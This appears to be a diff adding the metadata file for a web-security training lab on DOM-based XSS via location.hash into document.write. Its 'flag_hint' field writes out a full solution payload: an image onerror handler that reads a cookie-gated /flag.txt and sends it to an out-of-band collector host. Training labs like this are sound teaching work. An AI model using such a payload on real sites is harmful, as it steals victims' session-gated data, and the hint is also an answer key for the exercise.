@@ -1,0 +1,42 @@
+{
+  "$schema": "../../../labctl/src/schemas/meta.schema.json",
+  "schema_version": "1.0.0",
+  "id": "dom-xss-hash-document-write",
+  "title": "DOM XSS via location.hash into document.write",
+  "track": "xss",
+  "difficulty": "apprentice",
+  "estimated_minutes": 30,
+  "max_lifetime_minutes": 45,
+  "learning_objectives": [
+    "Identify a DOM-based XSS: a client-side source (location.hash) flowing to a client-side sink (document.write) with no sanitisation",
+    "Understand why the fragment never touches the server, so only a browser can trigger the sink",
+    "Use document.write of an <img onerror> to run JS during page parse",
+    "Leverage the victim's origin: a same-origin fetch of a cookie-gated resource sends the victim's cookie for you",
+    "Exfiltrate a same-origin secret you could never read directly to an OOB collector"
+  ],
+  "owasp_categories": ["A03:2021-Injection"],
+  "cwe_ids": ["CWE-79"],
+  "prerequisites": ["reflected-xss-search-noescape"],
+  "flag_hint": "Submit /#<img src=x onerror=\"fetch('/flag.txt').then(r=>r.text()).then(t=>{new Image().src='http://collector:9000/report?f='+encodeURIComponent(t)})\"> (URL-encoded) to POST /report; the admin bot's document.write executes it, its cookie reads /flag.txt, and the body beacons to the collector — read it via GET /oob/received.",
+  "tech_stack": [
+    "Python 3.12",
+    "Flask 3.1",
+    "gunicorn 23",
+    "vanilla JS (location.hash → document.write sink)",
+    "@websec-lab/xss-verifier headless-Chromium bot",
+    "stdlib OOB collector"
+  ],
+  "tags": [
+    "xss",
+    "dom-xss",
+    "document-write",
+    "same-origin-read",
+    "oob-exfil",
+    "victim-bot",
+    "cwe-79"
+  ],
+  "risk": "low",
+  "authors": ["furkanalp41"],
+  "exposed_service": { "container_port": 8080, "protocol": "http", "http_path": "/" },
+  "inspired_by": "The canonical DOM-XSS-via-fragment pattern, abstracted for local Docker with a Playwright victim bot and a cookie-gated same-origin secret"
+}
